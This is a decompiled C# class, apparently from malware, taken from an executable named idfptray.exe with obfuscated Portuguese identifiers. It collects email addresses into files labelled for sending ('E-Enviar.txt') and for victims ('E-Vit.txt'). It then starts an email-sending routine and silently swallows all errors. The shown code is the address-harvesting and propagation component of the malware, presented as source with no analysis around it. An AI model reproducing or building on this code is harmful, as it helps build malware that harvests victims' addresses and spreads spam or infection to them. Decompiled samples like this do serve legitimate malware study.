// Decompiled with JetBrains decompiler
// Type: Xpctra.COCEGAS751FORNECER
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.IO;
using Xpctra.Properties;

namespace Xpctra
{
  internal class COCEGAS751FORNECER
  {
    public static void AdicionaEmails(string Email)
    {
      COCEGAS751FORNECER cocegaS751Fornecer = new COCEGAS751FORNECER();
      lock (new object())
      {
        try
        {
          if (File.Exists(Settings.Default.CaminhoPath + "E-Enviar.txt"))
          {
            StreamReader streamReader = new StreamReader(Settings.Default.CaminhoPath + "E-Enviar.txt");
            string end = streamReader.ReadToEnd();
            streamReader.Dispose();
            streamReader.Close();
            if (!end.Contains(Email) && Email.Contains(".com") || Email.Contains(".br") || Email.Contains(".net"))
              cocegaS751Fornecer.OITO80COBICAR(Settings.Default.CaminhoPath + "E-Enviar.txt", Email);
          }
          else
            cocegaS751Fornecer.OITO80COBICAR(Settings.Default.CaminhoPath + "E-Enviar.txt", Email);
          if (PORTA155LINGUAGEMFONTE.Enviando)
            return;
          new PORTA155LINGUAGEMFONTE().EnviaEmails();
        }
        catch (Exception ex)
        {
        }
      }
    }

    public static void AdiCinaEmailVitima(string Email)
    {
      COCEGAS751FORNECER cocegaS751Fornecer = new COCEGAS751FORNECER();
      lock (new object())
      {
        try
        {
          if (File.Exists(Settings.Default.CaminhoPath + "E-Vit.txt"))
          {
            StreamReader streamReader = new StreamReader(Settings.Default.CaminhoPath + "E-Vit.txt");
            string end = streamReader.ReadToEnd();
            streamReader.Dispose();
            streamReader.Close();
            if (end.Contains(Email))
              return;
            cocegaS751Fornecer.OITO80COBICAR(Settings.Default.CaminhoPath + "E-Vit.txt", Email);
          }
          else
            cocegaS751Fornecer.OITO80COBICAR(Settings.Default.CaminhoPath + "E-Vit.txt", Email);
        }
        catch (Exception ex)
        {
        }
      }
    }

    private void OITO80COBICAR(string Nometxt, string Email)
    {
      if (!File.Exists(Nometxt))
        File.Create(Nometxt).Dispose();
      StreamWriter streamWriter = File.AppendText(Nometxt);
      streamWriter.WriteLine(Email);
      streamWriter.Dispose();
      streamWriter.Close();
    }
  }
}
